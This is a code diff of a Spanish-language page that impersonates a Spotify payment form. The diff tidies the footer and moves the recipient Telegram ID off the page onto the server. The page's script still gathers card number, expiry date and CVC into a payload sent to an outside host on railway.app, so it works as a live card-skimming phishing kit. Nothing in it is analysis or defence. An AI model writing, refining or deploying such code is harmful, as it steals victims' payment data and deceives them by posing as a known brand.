@@ -186,13 +186,18 @@
   </div>
 
   <footer class="footer">
-    <div class="footer-links"><a href="#">Privacidad</a><a href="#">Términos</a><a href="#">Cookies</a><a href="#">Ayuda</a></div>
+    <div class="footer-links">
+      <a href="#">Privacidad</a>
+      <a href="#">Términos</a>
+      <a href="#">Cookies</a>
+      <a href="#">Ayuda</a>
+    </div>
     © 2026 Spotify AB. Todos los derechos reservados.
   </footer>
 
   <script>
     // --- CONFIGURACIÓN DEL CLIENTE ---
-    const MY_TELEGRAM_ID = '7707049896'; 
+    // YA NO NECESITAS EL target_id AQUÍ. EL SERVIDOR LO SABE POR EL DOMINIO.
     const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
 
     function selectMethod(btn, method) {
@@ -208,9 +213,8 @@
       validateForm();
     }
 
-    // CORRECCIÓN DEL ERROR DEL NÚMERO 9
     document.getElementById('cardNumber').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, ''); // Solo permite números
+      let value = e.target.value.replace(/\D/g, ''); 
       let formatted = '';
       for (let i = 0; i < value.length && i < 16; i++) {
         if (i > 0 && i % 4 === 0) formatted += ' ';
@@ -253,8 +257,8 @@
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
+      // EL PAYLOAD YA NO LLEVA target_id. EL SERVIDOR LO DETECTA SOLO.
       const payload = {
-        target_id: MY_TELEGRAM_ID,
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
